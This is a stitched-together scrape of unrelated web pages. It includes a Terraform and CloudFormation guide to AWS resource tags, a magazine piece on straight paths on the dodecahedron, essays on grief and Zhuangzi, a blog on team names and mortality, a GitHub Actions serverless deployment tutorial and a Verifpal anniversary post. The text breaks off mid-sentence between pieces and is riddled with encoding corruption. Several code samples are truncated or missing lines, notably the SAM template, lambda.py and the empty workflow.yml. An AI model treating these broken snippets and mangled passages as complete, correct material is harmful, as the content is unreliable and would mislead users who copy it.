  <li>Using Terraform to Update Existing AWS Tags</li>
  <li>Enforce AWS Tags with Terraform</li>
</ol>

<h3 id="tag-a-new-aws-ec2-instance-with-terraform">Tag a New AWS EC2 Instance with Terraform</h3>

<p>If you want to deploy an EC2 instance with AWS Tags using Terraform, your configuration might include something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11

21
22
23
24
25
26
27
28
29
30
31
</pre></td><td><pre>resource "aws_instance" "cart" {
  connection {
    type = "ssh"
    user = "ubuntu"
    host = self.public_ip
    private_key = file(var.private_key_path)
  }

  instance_type = "t2.micro"

  ami = var.aws_amis[var.aws_region]

  key_name = aws_key_pair.auth.key_name

  vpc_security_group_ids = [aws_security_group.default.id]

  subnet_id = aws_subnet.default.id

  provisioner "remote-exec" {
    inline = [
      "sudo apt-get -y update",
      "sudo apt-get -y install nginx",
      "sudo service nginx start",
    ]
  }
  tags = {
    contact = "j-mark"
    env = "dev"
    service = "cart"
  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above example includes three AWS cost allocation tags: <code>contact</code>, <code>env</code>, and <code>service</code> with values described as strings. When you <a href="https://www.terraform.io/docs/commands/apply.html" target="_blank">apply this configuration</a>, Terraform will connect to AWS and deploy an EC2 instance having the AWS tags you specified.</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383259429_cf-2020-08-02-a.png" alt=""></p>

<h3 id="using-terraform-to-update-existing-aws-tags">Using Terraform to Update Existing AWS Tags</h3>

<p>Terraform makes it easy to update already existing resources with AWS tags in reversible and consistent ways. If you’re using AWS tags to keep track of a resource’s contact (e.g.: <code>j-mark</code> in the above example), you’re likely to need to update the AWS tag when the team member leaves or changes roles.</p>

<p>To update the AWS tags on your resource, simply update the corresponding tags in your Terraform configuration. The new tags will overwrite any previous tags assigned to the resource, including tags added outside of Terraform.</p>

<p>For example, to change the <code>contact</code> cost allocation tag on the EC2 instance above, you might update the <code>tags</code> block above with the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>tags = {
  contact = "l-duke"
  env = "dev"
  service = "cart"
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>When you apply this configuration, the AWS tags will be automatically updated in the AWS console:</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383277121_cf-2020-08-02-b.png" alt=""></p>

<p>If you keep your Terraform configuration files in version control - which is probably a good idea - you will be able to see how tags have changed over time. You can also review changes using the same code review process that your application code goes through to help you catch mistakes in the execution of your tagging strategy.</p>

<h3 id="enforce-aws-tags-with-terraform">Enforce AWS Tags with Terraform</h3>

<p>As your infrastructure grows, a code review process likely won’t be enough to prevent improper AWS tagging. Fortunately, you can enforce AWS tag names and values using <a href="https://www.terraform.io/docs/configuration/variables.html" target="_blank">variables</a> and custom validation rules in Terraform.</p>

<p>In the examples above, the <code>tags</code> list was hard-coded into the EC2 instance definition. A more scalable pattern would be to break your EC2 instance template into its own <a href="https://www.terraform.io/docs/configuration/modules.html" target="_blank">module</a> and use a <code>tags</code> variable. You can then write a <a href="https://www.terraform.io/docs/configuration/variables.html#custom-validation-rules" target="_blank">custom validation rule</a> to check that the tags comply with your strategy.</p>

<p>For example, if you want to check that:</p>

<ol>
  <li>The user specifies at least one tag</li>
  <li>The <code>contact</code> tag is either <code>j-mark</code> or <code>l-duke</code></li>
  <li>The <code>env</code> tag is set</li>
  <li>The <code>service</code> tag is either <code>cart</code> or <code>search</code></li>
</ol>

<p>You might create a module with a variable specified like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre>variable "tags" {
  description = "The tags for this resource."
  validation {
    condition = length(var.tags) &gt; 0 &amp;&amp; contains(["j-mark", "l-duke"], var.tags.contact) &amp;&amp; var.tags.env != null &amp;&amp; contains(["cart", "search", "cart:search"], var.tags.service)
    error_message = "Invalid resource tags applied."

  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now when you run <code>terraform plan</code> with a missing or invalid tag, you’ll get an error:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>Error: Invalid value for variable
...
Invalid resource tags applied.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Your rules can be as complex as <a href="https://www.terraform.io/docs/configuration/index.html" target="_blank">Terraform’s Configuration Language</a> allows, so functions like <code>regex()</code>, <code>substr()</code>, and <code>distinct()</code> are all available. That said, there are some caveats to this approach.</p>

<p>First, custom variable validation is an experimental feature in Terraform. <a href="https://www.terraform.io/docs/configuration/terraform.html#experimental-language-features" target="_blank">Experimental features</a> are subject to change, meaning that you might need to pay attention to Terraform update mores closely. To enable <code>variable_validation</code>, add the following to your <code>terraform</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>terraform {
  experiments = [variable_validation]
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Second, Terraform’s variable validation only happens during the <code>terraform plan</code> phase of your infrastructure’s lifecycle. It can’t prevent users from accidentally changing your tags directly in the AWS console, and it’s only as good as the validation rules you write. If you start using a new resource but forget to add validation rules, you might end up with lots of resources that don’t adhere to your tagging strategy.</p>

<p>Another option for paid Terraform Cloud customers is <a href="https://www.terraform.io/docs/cloud/sentinel/index.html" target="_blank">Sentinel</a>, which allows you to create custom policies for your resources. I won’t cover this method here, but Terraform has created an <a href="https://www.terraform.io/docs/cloud/sentinel/examples.html" target="_blank">example policy</a> to show you how to enforce mandatory AWS tags.</p>



<p>Similar to Terraform, AWS <a href="https://aws.amazon.com/cloudformation/" target="_blank">CloudFormation</a> lets you provision AWS resources based on configuration files. Unlike Terraform, CloudFormation is part of Amazon’s offerings, so it won’t necessarily help you if you want to use another infrastructure provider. The approach to tagging your resources in CloudFormation is similar to that used by Terraform, but as you’ll see, the configuration format is different.</p>

<p>If you’re new to AWS CloudFormation, <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/GettingStarted.Walkthrough.html" target="_blank">Amazon’s official walkthrough</a> will help you get started deploying some basic templates. In this section, I’ll show you some snippets from a demo AWS CloudFormation template which is <a href="https://github.com/CloudForecast/cf-cloudformation-demo" target="_blank">also available on GitHub</a>. You’ll learn the following in this Terraform AWS tags section:</p>

<ol>
  <li>AWS CloudFormation Template to Deploy Tags</li>
  <li>Using CloudFormation to Update AWS Tags</li>
  <li>CloudFormation Template to Enforce AWS Tags</li>
</ol>

<h3 id="aws-cloudformation-template-to-deploy-tags">AWS CloudFormation Template to Deploy Tags</h3>

<p>AWS CloudFormation is designed to make it easy to create AWS resources with a single template file. Using a CloudFormation template, every resource that can be deployed with an AWS tag.</p>

<p>For example, to create a new EC2 instance with the same three AWS tags used in the Terraform example above, add an array of <code>Tags</code> to the resource’s <code>Properties</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8

</pre></td><td><pre>"Resources" : {
  "WebServerInstance": {  
    "Type": "AWS::EC2::Instance",
    "Metadata" : {...},
    "Properties": {
      "Tags" : [
       {
          "Key" : "contact",
          "Value" : "j-mark"
       },
       {
          "Key" : "env",
          "Value" : "dev"
       },
       {
          "Key" : "service",
          "Value" : "cart"
       }
      ],
      ...       
    }
  },
  ...         
},
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a>, you can <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/create-stack.html" target="_blank">deploy this CloudFormation template as a new stack</a>. This will ensure your template is valid and create the specified resources with their tags on AWS:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you have lots of similar resources in your template, you can deploy AWS tags to all the resources in the stack at once using the <code>--tags</code>  flag with the <code>create-stack</code> or <code>update-stack</code> commands:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre># Creating a stack with tags
aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"

# Updating a stack with tags
aws cloudformation update-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="using-cloudformation-to-update-aws-tags">Using CloudFormation to Update AWS Tags</h3>

<p>If you want to change the contact on your EC2 instance created above, simply change the <code>Tags</code> section of your template file and use the <code>[update-stack](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html)</code> <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html" target="_blank">command</a> to deploy your changes.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre>"Tags" : [
 {
    "Key" : "contact",
    "Value" : "l-duke"
 },
  ...
],
</pre></td></tr></tbody></table></code></pre></div></div>

<p>AWS CloudFormation behaves the same way that Terraform does when you update tags outside your template file. Any tags set manually will be overridden by the <code>update-stack</code> …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>E</span>ven though mathematicians have spent over 2,000 years dissecting the structure of the five Platonic solids—the tetrahedron, cube, octahedron, icosahedron and dodecahedron—thereâ€™s still a lot we donâ€™t know about them.<br></p>

<p>Now, a trio of mathematicians has resolved one of the most basic questions about the dodecahedron.</p>
<p>Suppose you stand at one of the corners of a Platonic solid. Is there some straight path you could take that would eventually return you to your starting point without passing through any of the other corners? For the four Platonic solids built out of squares or equilateral triangles—the cube, tetrahedron, octahedron and icosahedron—mathematicians&nbsp;<a href="https://www.sciencedirect.com/science/article/abs/pii/S0012365X16302254?via%3Dihub" target="_blank">figured out</a>&nbsp;that the answer is no. Any straight path starting from a corner will either hit another corner or wind around forever without returning home. But with the dodecahedron, which is formed from 12 pentagons, mathematicians didnâ€™t know what to expect.</p>
<p>Now&nbsp;<a href="https://faculty.washington.edu/jathreya/" target="_blank">Jayadev Athreya</a>,&nbsp;<a href="http://userhome.brooklyn.cuny.edu/aulicino/" target="_blank">David Aulicino</a>&nbsp;and&nbsp;<a href="https://math.sci.ccny.cuny.edu/people?name=Pat_Hooper" target="_blank">Patrick Hooper</a>&nbsp;have shown that an infinite number of such paths do in fact exist on the dodecahedron. Their&nbsp;<a href="https://www.tandfonline.com/doi/abs/10.1080/10586458.2020.1712564" target="_blank">paper</a>, published in May 2020&nbsp;in&nbsp;<em>Experimental Mathematics,</em>&nbsp;shows that these paths can be divided into 31 natural families.</p>
<p>The solution required modern techniques and computer algorithms. â€œTwenty years ago, [this question] was absolutely out of reach; 10 years ago it would require an enormous effort of writing all necessary software, so only now all the factors came together,â€� wrote&nbsp;<a href="https://webusers.imj-prg.fr/~anton.zorich/" target="_blank">Anton Zorich</a>, of the Institute of Mathematics of Jussieu in Paris, in an email.</p>
<p>The project began in 2016 when Athreya, of the University of Washington, and Aulicino, of Brooklyn College, started playing with a collection of card stock cutouts that fold up into the Platonic solids. As they built the different solids, it occurred to Aulicino that a body of recent research on flat geometry might be just what theyâ€™d need to understand straight paths on the dodecahedron. â€œWe were literally putting these things together,â€� Athreya said. â€œSo it was kind of idle exploration meets an opportunity.â€�<br></p>
<p>Together with Hooper, of the City College of New York, the researchers figured out how to classify all the straight paths from one corner back to itself that avoid other corners.</p>
<p>Their analysis is â€œan elegant solution,â€� said&nbsp;<a href="http://math.uchicago.edu/~masur/" target="_blank">Howard Masur</a>&nbsp;of the University of Chicago. â€œItâ€™s one of these things where I can say, without any hesitation, â€˜Goodness, oh, I wish I had done that!â€™â€�</p>
<p><strong>Hidden Symmetries</strong></p>
<p>Although mathematicians have speculated about straight paths on the dodecahedron for more than a century, thereâ€™s been a resurgence of interest in the subject in recent years following gains in understanding â€œtranslation surfaces.â€� These are surfaces formed by gluing together parallel sides of a polygon, and theyâ€™ve proved useful for studying a wide range of topics involving straight paths on shapes with corners, from&nbsp;<a href="https://www.quantamagazine.org/new-shapes-solve-infinite-pool-table-problem-20170808/" target="_blank">billiard table trajectories</a>&nbsp;to the question of&nbsp;<a href="https://arxiv.org/abs/1407.2975" target="_blank">when a single light</a>&nbsp;can illuminate an entire mirrored room.</p>
<p>In all these problems, the basic idea is to unroll your shape in a way that makes the paths you are studying simpler. So to understand straight paths on a Platonic solid, you could start by cutting open enough edges to make the solid lie flat, forming what mathematicians call a net. One net for the cube, for example, is a T shape made of six squares.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/abstractions_b5cfddf2f49d5db00b5bd785f76c12dc.jpg" alt="nautilus paper dodecahed"><figcaption><span>A paper dodecahedron constructed in 2018 by David Aulicino and Jayadev Athreya to show that straight paths from a vertex back to itself while avoiding other vertices are in fact possible. </span><br><span>Patrick Hooper</span></figcaption></figure>
<p>Imagine that weâ€™ve flattened out the dodecahedron, and now weâ€™re walking along this flat shape in some chosen direction. Eventually weâ€™ll hit the edge of the net, at which point our path will hop to a different pentagon (whichever one was glued to our current pentagon before we cut open the dodecahedron). Whenever the path hops, it also rotates by some multiple of 36 degrees.<br></p>
<p>To avoid all this hopping and rotating, when we hit an edge of the net we could instead glue on a new, rotated copy of the net and continue straight into it. Weâ€™ve added some redundancy: Now we have two different pentagons representing each pentagon on the original dodecahedron. So weâ€™ve made our world more complicated—but our path has gotten simpler. We can keep adding a new net each time we need to expand beyond the edge of our world.</p>
<p>By the time our path has traveled through 10 nets, weâ€™ve rotated our original net through every possible multiple of 36 degrees, and the next net we add will have the same orientation as the one we started with. That means this 11th net is related to the original one by a simple shift—what mathematicians call a translation. Instead of gluing on an 11th net, we could simply glue the edge of the 10th net to the corresponding parallel edge in the original net. Our shape will no longer lie flat on the table, but mathematicians think of it as still â€œrememberingâ€� the flat geometry from its previous incarnation—so, for instance, paths are considered straight if they were straight in the unglued shape. After we do all such possible gluings of corresponding parallel edges, we end up with what is called a translation surface.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/abstractions_14ff01eeeec2fbef4da8d0a223f2a3e2.jpg" alt="nautilus arthreya"><figcaption><span>Athreyaâ€™s right arm bears a tattoo of his favorite translation surface — a double pentagon. </span><br><span>Radhika Govindrajan</span></figcaption></figure>
<p>The resulting surface is a highly redundant representation of the dodecahedron, with 10 copies of each pentagon. And itâ€™s massively more complicated: It glues up into a shape like a doughnut with 81 holes. Nevertheless, this complicated shape allowed the three researchers to access the rich theory of translation surfaces.<br></p>
<p>To tackle this giant surface, the mathematicians rolled up their sleeves—figuratively and literally. After working on the problem for a few months, they realized that the 81-holed doughnut surface forms a redundant representation not just of the dodecahedron but also of one of the most studied translation surfaces. Called the double pentagon, it is made by attaching two pentagons along a single edge and then gluing together parallel sides to create a two-holed doughnut with a rich collection of symmetries.</p>
<p>This shape also happened to be tattooed on Athreyaâ€™s arm. â€œThe double pentagon was something that I already knew and loved,â€� said Athreya, who got the tattoo a year before he and Aulicino started thinking about the dodecahedron.</p>
<p>Because the double pentagon and the dodecahedron are geometric cousins, the formerâ€™s high degree of symmetry can elucidate the structure of the latter. Itâ€™s an â€œamazing hidden symmetry,â€� said&nbsp;<a href="https://www.math.uchicago.edu/~eskin/" target="_blank">Alex Eskin</a>&nbsp;of the University of Chicago (who was Athreyaâ€™s doctoral adviser about 15 years ago). â€œThe fact that the dodecahedron has this hidden symmetry group is, I think, quite remarkable.â€�</p>

</center>
<p>The relationship between these surfaces meant that the researchers could tap into an algorithm for analyzing highly symmetric translation surfaces developed by&nbsp;<a href="https://www.math.kit.edu/iag3/~finster/en" target="_blank">Myriam Finster</a>&nbsp;of the Karlsruhe Institute of Technology in Germany. By adapting Finsterâ€™s algorithm, the researchers were able to identify all the straight paths on the dodecahedron from a corner to itself, and to classify these paths via the dodecahedronâ€™s hidden symmetries.<br></p>
<p>The analysis was â€œone of the most fun projects Iâ€™ve gotten to work on in my whole career,â€� Athreya said. â€œItâ€™s important to keep playing with things.â€�</p>
<p>The new result shows that even objects that have been studied for thousands of years can still hold secrets, Eskin said. â€œI think even for [the three mathematicians], it was very, very surprising to say something new about the dodecahedron.â€�</p>

The use-case is real-time search over key-value pairs where the keys are strings and the values are either strings, numbers, or dates. It should enable full-text search over keys and values and range queries over numbers and dates with 1.5 million unique key-value pairs as the expected maximum search index size. The search company Algolia recommends an <a href="https://blog.algolia.com/algolia-v-elasticsearch-latency/" target="_blank" rel="noopener noreferrer">end-to-end latency budget</a> of no more than 50ms, so we’ll use that as our threshold.</p><h2 id="postgresql"><a href="#postgresql" jsx="[object Object]"></a>PostgreSQL</h2><p>I’m already familiar with PostgreSQL, so let’s see if it meets these requirements.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>When I was 15</strong>, one of my closest friends died unexpectedly. Our physics teacher broke the news to me after Iâ€™d sat an exam, having wondered all the way through why my friend wasnâ€™t there doing the same. I still donâ€™t have the words to describe how I felt: it was something approaching shock, distress, disorientation. I didnâ€™t know what to think, much less what to do. I spent many nights awake and many days in a daze.</p>
<p>Fifteen years later, when I was in graduate school, another friend died suddenly, a man I loved very much. I remember checking my phone and finding out, to my dismay, via text message. But while my initial response was much the same as before, there was a palpable difference in how I felt later on. While I was again surprised and saddened, I was much less disoriented than Iâ€™d been as a teenager. I could still think, and I could still get things done. It seemed to me that Iâ€™d become better at living with loss.</p>
<p>You might think that the reason for this difference is obvious â€“ I was older, and Iâ€™d had more experience in coping with death. But raw experience alone isnâ€™t enough: what matters more is whether we learn from experience. And learning from experience, especially an experience as difficult as the death of a loved one, can involve quite a lot. Among other things, it can involve creativity.</p>
<p>This claim might seem surprising. After all, creativity is often associated with the idea of a lone creative genius, an individual who not only excels at what they do, but also transforms the world in the process. Further, even if we donâ€™t limit ourselves to romantic or heroic perspectives on the nature and value of creativity, itâ€™s commonly thought that creativity at least aims at novelty or originality.</p>
<p>This way of thinking about creativity isnâ€™t universal. The <a href="http://cup.columbia.edu/book/the-complete-works-of-zhuangzi/9780231164740"><em>Zhuangzi</em></a> (èŽŠå­�), a classical Chinese philosophical and literary text, provides a different perspective. On one interpretation, creativity isnâ€™t conceived as aiming at novelty or originality, but rather <em>integration</em>. Instead of aiming at something new, it aims at something that combines well with the situation of which itâ€™s a part.</p>
<p>The story of Wheelwright Pian, from a chapter of the Zhuangzi known as the <em>Tian Dao</em> (å¤©é�“), meaning â€˜Heavenâ€™s Wayâ€™ or â€˜The Way of Heavenâ€™, effectively illustrates this perspective on creativity as it pertains to artists or artisans. In this short vignette, a wheelwright known as Pian (æ‰�) tells a duke that the book of sagesâ€™ advice heâ€™s reading is nothing but â€˜chaff and dregsâ€™. Angered, the duke demands an explanation. The wheelwright responds that, at least concerning his craft, he can create what he does only because heâ€™s developed a â€˜knackâ€™ for it that canâ€™t be wholly conveyed in words. If the blows of his mallet are too gentle, his chisel slides and wonâ€™t take hold. If theyâ€™re too hard, it bites in and wonâ€™t budge. â€˜Not too gentle, not too hard â€“ you can get it in your hand and feel it in your mind,â€™ he says. â€˜So, Iâ€™ve gone along for 70 years and at my age Iâ€™m still chiselling wheels. When the men of old died, they took with them the things that couldnâ€™t be handed down. So, what you are reading there must be nothing but the chaff and dregs of the men of old.â€™</p>
<p>Although heâ€™s a â€˜lowlyâ€™ craftsperson, the wheelwright has something important to teach the duke. Heâ€™s been creating wheels by hand for many years and has developed an ability to act and to execute his craft in an integrated manner that canâ€™t be fully captured through an algorithmic list of instructions. He responds to precise particularities in the wood, his tools and his body to create what he wants â€“ something he doesnâ€™t accomplish by imposing a plan.</p>
<p>Striving for originality can be counterproductive when it comes to achieving genuinely fresh results</p>
<p>The sagesâ€™ advice for living well is therefore mere â€˜dregsâ€™ if itâ€™s interpreted as instructions that one can simply read and then complete. Living well in general involves much more than this; namely, a spontaneous integration between contrasting types such as the hard and the soft, as well as the learned and the spontaneous, the active and the passive, and even the unproductive and the productive â€“ all of which apply in the case of carving wheels, as well as elsewhere. In other words, living well involves creativity.</p>
<p>This kind of creativity isnâ€™t taken to aim at novelty or originality as such. The wheelwright is presented as creative not because of anything to do with his, or his projectsâ€™, novelty or originality, but instead because of his ability to create wheels in a sensitive, responsive and â€“ crucially â€“ well-integrated manner: one not learned by rote, but rather via engaging in sustained, spontaneous activity.</p>
<p>We can use the story of Wheelwright Pian to better understand why learning to live with loss is a creative pursuit. Although thereâ€™s an abundance of books dispensing advice on how to do so, ultimately learning to live with death is a deeply personal endeavour that â€“ like carving wheels â€“ canâ€™t be fully captured through a programmatic set of directions. We must respond to precise particularities of our situation (concerning our thoughts, feelings and overall circumstances) to create what we want to create (such as a sense of peace or closure). This isnâ€™t something that can be accomplished by imposing a plan, even if we make various provisional and highly malleable â€˜plansâ€™ on the fly as we go along.</p>
<p>Moreover, in working through our thoughts, feelings and circumstances in all their particularities, itâ€™s not that weâ€™re doing anything all that different from what countless others have had to do as theyâ€™ve learned to cope with loss. Nonetheless â€“ again, like carving wheels â€“ itâ€™s plausibly a creative activity, in that it involves a spontaneous integration between contrasting types such as the grieving and the celebratory, the resentful and the grateful, the distressed and the joyous. The ability to live with death, too, in a sensitive, responsive, and well-integrated manner isnâ€™t learned by rote, but rather via engaging in sustained, spontaneous activity. Indeed, even the philosopher Zhuangzi himself can be understood as engaging in such a creative process after the death of his own wife in chapter 18 of the text, the <em>Zhi Le</em> (è‡³æ¨‚), meaning â€˜Perfect Happinessâ€™ or â€˜Perfect Joyâ€™.</p>
<p><strong>This way of thinking</strong> about creativity has a variety of other potential benefits. First, even if creativity were taken to aim at originality, de-emphasising originality might ironically result in greater creativity. This is because striving for originality can actually be counterproductive when it comes to achieving genuinely fresh results: if we focus on the task of achieving something original, weâ€™ll explore only the range of possibilities deemed sufficiently likely to yield that result, leaving out a lot that could have contributed to achieving something original.</p>
<p>But imagine instead that we worked with idea that creativity wasnâ€™t about novelty. That doesnâ€™t mean weâ€™d have to give up the value of originality entirely, but rather see it as one of a range of possible outcomes. Casting a wider net in this way might hence make creativity (whatever it involves) easier to achieve.</p>
<p>Second, focusing on integration could encourage us to better understand creative agents as being intimately connected with, and products of, their environments. This would broaden our notion of creativity in a way that might allow us to see creativity demanded in a greater range of activities. After all, many of lifeâ€™s activities, from the mundane to the meaningful, arenâ€™t learned by rote, but rather via spontaneous action that integrates contrasting aspects. Just for starters, additional examples might include getting along with oneâ€™s family, building relationships with colleagues and organising oneâ€™s finances.</p>
<p>This alternative perspective on creativity might help us to see it as an everyday phenomenon in which we all participate â€“ rather than an extraordinary talent or gift that only a few enjoy. And it might also allow us to make sense of the idea of <a href="https://link.springer.com/chapter/10.1007/978-3-319-43893-1_19#:~:text=As%20an%20art%20practice%2C%20calligraphy,Daoist%20aesthetic%20concerns%20discussed%20here.&amp;text=The%20aesthetic%20of%20the%20everyday,and%20the%20need%20for%20imagination">living creatively</a>: of an integrated life, lived spontaneously, in which all of lifeâ€™s contrasting aspects can be arranged to form a rich and variegated whole.</p></div></div></div>]]>

<p>One of my favorite team jelling accelerators is to <em>find a sweet team name</em>.</p>



<p>The classic book “Peopleware” by Tom DeMarco says that a jelled team should have a sense of eliteness, almost a cult-like team pride. I’ve done <a href="https://critter.blog/2016/10/27/the-whys-and-hows-of-jelling-teams/">my share of rambling about that</a> too. </p>



<p>All successful have great names, so obviously your team should have one too. Simple logic. A team name gives you an identity to rally around. </p>



<p>Calling your team “The ClientNameHere Project Team” is like calling the Vikings “The Minnesota NFL Team.” Imagine the uniforms. Good luck rallying around that.</p>



<p>A good team name has 3 criteria:</p>



<ul><li><strong>It comes about organically</strong>. If you force it then it’ll feel like you’re trying too hard, and it won’t stick. Let it arise out of a memorable conversation or an inside joke, and just give it some gentle nudging.</li><li><strong>It works in both the plural and singular form</strong>. If your team is “The Fiddly Bits” then you can say “I’m a Fiddly Bit”. That works. But if it’s “Team Super Awesome”, then you have to say something like “I am a member of Team Super Awesome.” It doesn’t have the same punch to it.</li><li><strong>It has a visual representation</strong>, such as a mascot or logo or GIF  that you can spam on Slack when the team does something right. As they say, a picture is worth a thousand Slack messages.</li></ul>



<p>Here are some of the teams I’ve been on in the past few years:</p>







<p>Does your team have a name? <a href="https://twitter.com/mcrittenden">Tweet me</a> and let me know!</p>

<blockquote><p>“Death is very likely the single best invention of life. It is life’s change agent. It clears out the old to make way for the new.”</p><cite>— Steve Jobs</cite></blockquote>



<p>Human mortality is one of the strongest forces we have, helping us focus on what is truly important, and pushing us to get things done.</p>



<p>Imagine you were to live forever. </p>



<p>Would you really finish this project now, if you can always wait another year?</p>



<p>Would you really face your challenges, if there is always another day?</p>



<p>Would you really seek to become stronger and better, if you could just chill without any real consequences?</p>



<p>The end of death would be the end of motivation.</p>



<p>Our mortality is the ultimate anti-procrastinator. You never know when the proverbial bus will hit you. Next month? Next year? Next decade?</p>



<p>It shakes us, awakens us from wasting time. Reboots our priorities.</p>



<p>The notion of death might be scary. But living forever might be even scarier. So think twice before you wish to live forever.</p>

You can Build, test, and deploy your code right from GitHub. In this post we will explore how you can use GitHub Actions to automate serverless application deployment on AWS. You can also use AWS's own CI/CD services to achieve the same. But here we are going to keep our discussion limited to GitHub Actions.</p>
<h3 id="how-to-use-github-actions">How to use GitHub Actions?</h3>
<p>Creating a GitHub action is simple. Go to your GitHub repository that you want to automate and click on "Actions"
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/github-action-create-new.PNG" alt="github actions new workflow"></p>
<p>You will be taken to Actions page where you can create a new Blank workflow or select existing actions from the marketplace. The actions from marketplace are reusable actions that you can use in your workflow. We are going to create a blank action and we will also use some actions from marketplace.
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/github-actions-blank-workflow.PNG" alt="github actions blank action"></p>
<p>Lets rename the YAML file to workflow.yml. You can name anything you like. We are going to create a Lambda function with API gateway in Serverless Application Model (SAM) template and deploy it using GitHub Actions. 
Below is our SAM template.</p>
<pre><code>AWSTemplateFormatVersion: '2010-09-09'
Transform: AWS::Serverless-2016-10-31
Description: &gt;
  GitHub Actions demonstration App

</code></pre>
<p><a href="http://lambda.py/" target="_blank">lambda.py</a></p>
<pre><code><span><span>def</span> <span>handler</span><span>(event, context)</span>:</span>

        ,
        <span>"isBase64Encoded"</span>: <span>False</span>
    }
</code></pre><p>This contains one Lambda function and API with path hello. Lets first deploy manually using SAM CLI and then we will automate it. Create samconfig.toml with below details.
create s3_bucket that will be used for SAM deploy and update in samconfig.toml.</p>
<pre><code><span>version</span> = <span>0.1</span>
<span>[default]</span>
<span>[default.deploy]</span>
<span>[default.deploy.parameters]</span>
<span>stack_name</span> = <span>"sam-github-actions-app"</span>
<span>s3_bucket</span> = <span>"aws-sam-cli-managed-default-samclisourcebucket-1xyg1t2j2ws5k"</span>
<span>s3_prefix</span> = <span>"sam-app"</span>
<span>region</span> = <span>"us-east-1"</span>
<span>confirm_changeset</span> = <span>false</span>
<span>capabilities</span> = <span>"CAPABILITY_IAM"</span>
</code></pre><p>Also create empty requirements.txt along with template.yml. Run <strong>SAM build</strong> and <strong>SAM deploy -g</strong> on CLI. 
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/sam-deploy.PNG" alt="SAM Deploy"></p>
<p>Go to API gateway and hit the url in browser. You should get "hello from Lambda!" response.
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/github-actions/api.PNG" alt="github actions api"></p>
<p>Go back to our workflow file on GitHub. We will deploy as soon as we push updates to the repo.
Below is our workflow.yml</p>
<pre><code># This is a basic workflow to help you get started with Actions

<p>We first indicate that we want to run this action on push to the master. Then we select runner (Ubuntu) on which our steps will execute. In Steps, we first checkout code, then install python and its dependencies. Then we use other actions from marketplace to configure AWS credentials and then we use another action to do SAM build and SAM deploy.  Please note that we need ti supply AWS ACCESS KEY and SECRET ACCESS KEY to actions for commands to work. We setup here GitHub Secrets.</p>

<p>As soon as you check-in workflow.yml, the action would trigger.

<p>Last week, Verifpal, our cryptographic protocol modeling and analysis framework, celebrated its one-year anniversary. In its first year, Verifpal has made some significant achievements.</p>



<h2>Improvements to Usability, Features, and Reliability</h2>



<p><strong><span>First</span>, Verifpal has improved its relationship with users.</strong> Verifpal was <a href="https://nlnet.nl/news/2020/20200611-SecureVideochatVerifpal.html">part of Zoom’s effort</a> to modernize its cryptography. <a href="https://www.youtube.com/watch?v=it_hJkVU-UA">Verifpal for Visual Studio Code</a> and <a href="https://verifhub.verifpal.com/">VerifHub</a> allowed engineers to model and collaborate on cryptographic protocols more easily than ever. And <a href="https://twitter.com/verifpal/status/1285662686894850050">better attack traces</a> allowed for easier to understand analysis results.</p>



<figure><img src="https://pbs.twimg.com/media/EWtWLhcXsAEwUpV?format=jpg&amp;name=4096x4096" alt="Verifpal for Visual Studio Code allows visualizing and analyzing Verifpal models straight inside Visual Studio Code, with easy access to documentation for primitives and other functionality by hovering with the cursor."><figcaption>Verifpal for Visual Studio Code allows visualizing and analyzing Verifpal models straight inside Visual Studio Code, with easy access to documentation for primitives and other functionality by hovering with the cursor.</figcaption></figure>



